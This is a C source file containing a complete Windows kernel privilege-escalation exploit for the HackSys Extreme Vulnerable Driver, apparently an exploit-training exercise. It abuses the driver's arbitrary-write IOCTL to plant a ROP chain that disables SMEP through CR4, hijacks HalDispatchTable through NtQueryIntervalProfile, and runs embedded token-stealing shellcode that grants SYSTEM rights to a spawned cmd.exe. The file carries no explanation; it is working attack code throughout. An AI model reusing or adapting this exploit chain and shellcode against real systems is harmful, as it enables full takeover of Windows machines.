#undef UNICODE
#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <Psapi.h>
#include <iostream>
#include <string>
#include <stdlib.h>
#include <stddef.h>
#include <stdint.h>
#include <heapapi.h>
#include <TlHelp32.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;

#define MAXIMUM_FILENAME_LENGTH 255 
#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW                  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW_GS               CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_POOL_OVERFLOW                   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_USE_UAF_OBJECT                  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT                 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x807, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_TYPE_CONFUSION                  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x808, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_INTEGER_OVERFLOW                CTL_CODE(FILE_DEVICE_UNKNOWN, 0x809, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE        CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80A, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80B, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_UNINITIALIZED_HEAP_VARIABLE     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80C, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_DOUBLE_FETCH                    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80D, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_INSECURE_KERNEL_FILE_ACCESS     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80E, METHOD_NEITHER, FILE_ANY_ACCESS)
#define DEVICE_NAME  "\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
#define STACK_OVERFLOW_IOCTL_NUMBER     IOCTL(0x800)

HANDLE hDriver;

typedef struct SYSTEM_MODULE {
    ULONG                Reserved1;
    ULONG                Reserved2;
#ifdef _WIN64
    ULONG				Reserved3;
#endif
    PVOID                ImageBaseAddress;
    ULONG                ImageSize;
    ULONG                Flags;
    WORD                 Id;
    WORD                 Rank;
    WORD                 w018;
    WORD                 NameOffset;
    CHAR                 Name[MAXIMUM_FILENAME_LENGTH];
}SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct _WRITE_WHAT_WHERE
{  
PULONG_PTR What;
PULONG_PTR Where;
} WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;

#define QWORD ULONGLONG
QWORD ntbase, hevdbase;
QWORD HalDispatchTable, HaliQuerySystemInformation;
#define ADDR(x) (x - 0x0140000000 + ntbase)

QWORD getBaseAddr(LPCSTR drvName) {
    LPVOID drivers[512];
    DWORD cbNeeded;
    int nDrivers, i = 0;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
        CHAR szDrivers[512];
        nDrivers = cbNeeded / sizeof(drivers[0]);
        for (i = 0; i < nDrivers; i++) {
            if (GetDeviceDriverBaseNameA(drivers[i], szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0]))) {
                if (strstr(szDrivers, drvName)) {
                    return (QWORD)drivers[i];
                }
            }
        }
    }
    return 0;
}

BOOL ArbitraryWrite(u64 where, u64* what, u64 *off){
    printf("Prepare to write *(%p) = %p\n", where, what);
    PWRITE_WHAT_WHERE payload = (PWRITE_WHAT_WHERE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(WRITE_WHAT_WHERE));
    payload->Where = (PULONG_PTR)((char*)where + *off);
    payload->What = (PULONG_PTR)what;
    DWORD returned;
    DeviceIoControl(hDriver, HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE,
                    payload, sizeof(WRITE_WHAT_WHERE), NULL, 0, &returned, NULL);
    HeapFree(GetProcessHeap(), 0, payload);
    u64 p = *off;
    p += 8;
    *off = p;   
    return true;
}

//BYTE shellcode[256] = { 0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, 0x49, 0x89, 0xC7, 0x4D, 0x8B, 0xBF, 0x48, 0x04, 0x00, 0x00, 0x49, 0x81, 0xEF, 0x48, 0x04, 0x00, 0x00, 0x4D, 0x8B, 0xB7, 0x40, 0x04, 0x00, 0x00, 0x49, 0x83, 0xFE, 0x04, 0x75, 0xE2, 0x4D, 0x89, 0xFA, 0x49, 0x89, 0xC7, 0x4D, 0x8B, 0xBF, 0x48, 0x04, 0x00, 0x00, 0x49, 0x81, 0xEF, 0x48, 0x04, 0x00, 0x00, 0x4D, 0x8B, 0xB7, 0x40, 0x04, 0x00, 0x00, 0x49, 0x81, 0xFE, 0x34, 0x12, 0x00, 0x00, 0x75, 0xE2, 0x4D, 0x89, 0xFB, 0x4D, 0x8B, 0xA2, 0xB8, 0x04, 0x00, 0x00, 0x4D, 0x89, 0xA3, 0xB8, 0x04, 0x00, 0x00, 0x48, 0x31, 0xC0, 0x48, 0x31, 0xDB, 0xC3 };
//BYTE shellcode[256] = { 0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, 0x49, 0x89, 0xC7, 0x4D, 0x8B, 0xBF, 0x48, 0x04, 0x00, 0x00, 0x49, 0x81, 0xEF, 0x48, 0x04, 0x00, 0x00, 0x4D, 0x8B, 0xB7, 0x40, 0x04, 0x00, 0x00, 0x49, 0x83, 0xFE, 0x04, 0x75, 0xE2, 0x4D, 0x89, 0xFA, 0x49, 0x89, 0xC7, 0x4D, 0x8B, 0xBF, 0x48, 0x04, 0x00, 0x00, 0x49, 0x81, 0xEF, 0x48, 0x04, 0x00, 0x00, 0x4D, 0x8B, 0xB7, 0x40, 0x04, 0x00, 0x00, 0x49, 0x81, 0xFE, 0x34, 0x12, 0x00, 0x00, 0x75, 0xE2, 0x4D, 0x89, 0xFB, 0x4D, 0x8B, 0xA2, 0xB8, 0x04, 0x00, 0x00, 0x4D, 0x89, 0xA3, 0xB8, 0x04, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x66, 0x8B, 0x88, 0xE4, 0x01, 0x00, 0x00, 0x66, 0xFF, 0xC1, 0x66, 0x89, 0x88, 0xE4, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x8A, 0x68, 0x01, 0x00, 0x00, 0x4C, 0x8B, 0x9A, 0x78, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xA2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x9A, 0x58, 0x01, 0x00, 0x00, 0x31, 0xC0, 0x0F, 0x01, 0xF8, 0x48, 0x0F, 0x07, 0xC3 };
BYTE shellcode[256] = { 0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, 0x49, 0x89, 0xC7, 0x4D, 0x8B, 0xBF, 0x48, 0x04, 0x00, 0x00, 0x49, 0x81, 0xEF, 0x48, 0x04, 0x00, 0x00, 0x4D, 0x8B, 0xB7, 0x40, 0x04, 0x00, 0x00, 0x49, 0x83, 0xFE, 0x04, 0x75, 0xE5, 0x4D, 0x89, 0xFA, 0x49, 0x89, 0xC7, 0x4D, 0x8B, 0xBF, 0x48, 0x04, 0x00, 0x00, 0x49, 0x81, 0xEF, 0x48, 0x04, 0x00, 0x00, 0x4D, 0x8B, 0xB7, 0x40, 0x04, 0x00, 0x00, 0x49, 0x81, 0xFE, 0x34, 0x12, 0x00, 0x00, 0x75, 0xE2, 0x4D, 0x89, 0xFB, 0x4D, 0x8B, 0xA2, 0xB8, 0x04, 0x00, 0x00, 0x4D, 0x89, 0xA3, 0xB8, 0x04, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x66, 0x8B, 0x88, 0xE4, 0x01, 0x00, 0x00, 0x66, 0xFF, 0xC1, 0x66, 0x89, 0x88, 0xE4, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x8A, 0x68, 0x01, 0x00, 0x00, 0x4C, 0x8B, 0x9A, 0x78, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xA2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xAA, 0x58, 0x01, 0x00, 0x00, 0x31, 0xC0, 0x0F, 0x01, 0xF8, 0x48, 0x0F, 0x07 };
int main(int argc, char** argv)
{

    hDriver = CreateFile("\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDriver == INVALID_HANDLE_VALUE)
    {
        printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
        exit(1);
    }
    ntbase = getBaseAddr("ntoskrnl.exe");
    hevdbase = getBaseAddr("HEVD.sys");
    HalDispatchTable = (QWORD)ntbase + 12591328;
    HaliQuerySystemInformation = (QWORD)HalDispatchTable + 8;
    //printBaseAddr();
    printf("Kbase: 0x%llx\n", ntbase);
    printf("HEVD base: 0x%llx\n", hevdbase);
    printf("HalDispatchTable: 0x%llx\n", HalDispatchTable);
    printf("HaliQuerySystemInformation: 0x%llx\n", HaliQuerySystemInformation);
    LPVOID sc = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    LPVOID kernelStack = VirtualAlloc((LPVOID)(0x48000000 - 0x10000), 0x14000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    u64 mem = 0x48000000;
    if (!VirtualLock((LPVOID)(mem - 0x10000), 0x14000)) {
        printf("Error using VirtualLock: %d\n", GetLastError());
        exit(1);
    }
    RtlFillMemory((LPVOID)(mem - 0x3000), 0x3000 + 0x38, '\x41');
    u64 cr4 = 0x50ef8;
    u64 pop_rcx = ADDR(0x0000000140203761);
    u64 ret = pop_rcx + 1;
    u64 mov_cr4_rcx = ADDR(0x000000014039b047);
    u64 off = 0;
    u64 kernel_data = mem + 0x38;
    u64 stack_pivot = ADDR(0x000000014057afc4); // mov esp, 0x48000000 ; add esp, 0x30 ; pop rbx ; ret
    printf("Buffer location: 0x%llx\n", kernel_data);
    RtlMoveMemory(sc, shellcode, 0x105);
    system("pause");
    // setup ROP
    ArbitraryWrite(kernel_data, &pop_rcx, &off);
    ArbitraryWrite(kernel_data, &cr4, &off);
    ArbitraryWrite(kernel_data, &mov_cr4_rcx, &off);
    ArbitraryWrite(kernel_data, (u64*)&sc, &off);

    //Create cmd process

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    TCHAR cmdLine[] = TEXT("cmd.exe");
    if (!CreateProcess(
        NULL,         // No module name (use command line)
        cmdLine,      // Command line
        NULL,         // Process handle not inheritable
        NULL,         // Thread handle not inheritable
        FALSE,        // Set handle inheritance to FALSE
        CREATE_NEW_CONSOLE,            // No creation flags
        NULL,         // Use parent's environment block
        NULL,         // Use parent's starting directory 
        &si,          // Pointer to STARTUPINFO structure
        &pi)          // Pointer to PROCESS_INFORMATION structure
        ) {
        printf("Failed to create cmd.exe");
        return -1;
    }
    u32 cmd_id = pi.dwProcessId;
    printf("cmd id: %u\n", cmd_id);
    *(u32*)((char*)sc + 0x4c) = cmd_id;
    u64 base = 5;
    // overwrite function pointer
    off = 0;
    ArbitraryWrite(HalDispatchTable, &base, &off);
    off = 0;
    ArbitraryWrite(HaliQuerySystemInformation, &stack_pivot, &off);
    typedef void (*PtrNtQueryIntervalProfile)(PVOID arg0, PVOID arg1);
    HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
    PtrNtQueryIntervalProfile _NtQueryIntervalProfile = (PtrNtQueryIntervalProfile)GetProcAddress(ntdll, "NtQueryIntervalProfile");
    if (_NtQueryIntervalProfile == NULL) {
        printf("[-] Failed to get address of NtQueryIntervalProfile.\n");
        exit(-1);
    }

    //HANDLE wiperthread = CreateThread(NULL, 0, WiperFunc, NULL, 0, NULL);
    printf("[*] Calling NtQueryIntervalProfile\n\n");
    _NtQueryIntervalProfile((PVOID)0xdeadbeef, &kernel_data);

    return 0;   
}
